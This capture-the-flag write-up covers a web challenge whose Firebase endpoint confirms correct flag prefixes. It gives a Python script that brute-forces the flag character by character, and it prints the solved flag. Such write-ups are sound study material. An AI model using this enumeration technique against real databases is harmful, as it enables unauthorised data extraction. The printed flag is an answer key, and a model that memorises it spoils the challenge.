# Best Bathroom on Campus

This is a web challenge accessible at https://best-bathroom-default-rtdb.firebaseio.com/flag/UDCTF.json     
An image is also provided in the challenge description:

![challenge_explaination](./bestbathroom.png)

As we can see the invoked API is returning `true` every time the url contains a valid substring(0, n) of the actual flag, where n is the number of characters of the substring sent so far. 

We can write a simple script to iterate through all possible printables characters and automatically increase the substring sent when a positive response is received, until the whole flag is obtained:

`best_bathroom.py`

```python
import requests
import string

url = "https://best-bathroom-default-rtdb.firebaseio.com/flag/UDCTF"
ending = ".json"
flag = "UDCTF"

while "}" not in flag:
    
    for c in string.printable:
        if c == '/' or c == '\\':
            continue
        
        r = requests.get(url=url+c+ending)
        response = r.text
        
        if response == "true":
            flag += c
            url += c
            break
print(flag)
```

which is kinda slow and unoptimized but in the end still gets the job done:

```python
# UDCTF{1ce_L4br4t0ry_s3C0nd_Fl0or_b0y's_b4thr00m}
```